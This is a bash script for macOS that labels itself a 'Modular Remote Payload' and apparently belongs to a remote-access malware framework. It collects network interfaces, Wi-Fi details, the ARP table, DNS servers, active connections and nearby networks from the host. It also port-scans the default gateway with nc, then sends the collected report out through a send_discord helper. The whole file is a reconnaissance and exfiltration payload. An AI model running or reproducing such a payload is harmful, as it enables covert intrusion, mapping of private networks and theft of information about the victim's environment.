#!/bin/bash
# ============================================================
# Network Scan for macOS - Modular Remote Payload
# ============================================================
# Scans local network for active hosts
# ============================================================

SYSID=$(get_sysid)
OUTPUT="🔍 **Network Scan from $SYSID**\n"
OUTPUT+="📅 $(date '+%Y-%m-%d %H:%M:%S')\n"
OUTPUT+="========================================\n\n"

# Network interfaces
OUTPUT+="**🌐 INTERFACES**\n"
ifconfig | grep -E "^[a-z]|inet " | grep -v "127.0.0.1" | while read line; do
    OUTPUT+="• \`$line\`\n"
done
OUTPUT+="\n"

# Wi-Fi info
OUTPUT+="**📶 WI-FI**\n"
WIFI_INFO=$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I 2>/dev/null)
if [[ -n "$WIFI_INFO" ]]; then
    SSID=$(echo "$WIFI_INFO" | grep " SSID" | awk -F: '{print $2}' | xargs)
    BSSID=$(echo "$WIFI_INFO" | grep "BSSID" | awk -F: '{print $2":"$3":"$4":"$5":"$6":"$7}' | xargs)
    RSSI=$(echo "$WIFI_INFO" | grep "agrCtlRSSI" | awk -F: '{print $2}' | xargs)
    OUTPUT+="• SSID: \`$SSID\`\n"
    OUTPUT+="• BSSID: \`$BSSID\`\n"
    OUTPUT+="• Signal: \`$RSSI dBm\`\n"
fi
OUTPUT+="\n"

# Default gateway
GATEWAY=$(netstat -rn | grep default | head -1 | awk '{print $2}')
OUTPUT+="**🚪 DEFAULT GATEWAY**\n"
OUTPUT+="• Gateway: \`$GATEWAY\`\n\n"

# ARP table
OUTPUT+="**📡 ARP TABLE**\n"
arp -a 2>/dev/null | head -15 | while read line; do
    OUTPUT+="• $line\n"
done
OUTPUT+="\n"

# Port scan on gateway
if [[ -n "$GATEWAY" ]]; then
    OUTPUT+="**🔓 GATEWAY PORTS**\n"
    for port in 22 80 443 445 548 3389 5900 8080; do
        nc -z -w1 "$GATEWAY" "$port" 2>/dev/null && OUTPUT+="• \`$port\` ✅ OPEN\n"
    done
    OUTPUT+="\n"
fi

# DNS servers
OUTPUT+="**🔎 DNS SERVERS**\n"
scutil --dns 2>/dev/null | grep "nameserver" | sort -u | head -5 | while read line; do
    OUTPUT+="• $line\n"
done
OUTPUT+="\n"

# Active connections
OUTPUT+="**📊 ACTIVE CONNECTIONS**\n"
netstat -an | grep ESTABLISHED | head -10 | while read line; do
    OUTPUT+="• \`$line\`\n"
done

# Nearby Wi-Fi networks
OUTPUT+="\n**📡 NEARBY NETWORKS**\n"
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s 2>/dev/null | head -10 | while read line; do
    OUTPUT+="• $line\n"
done

send_discord "$OUTPUT"

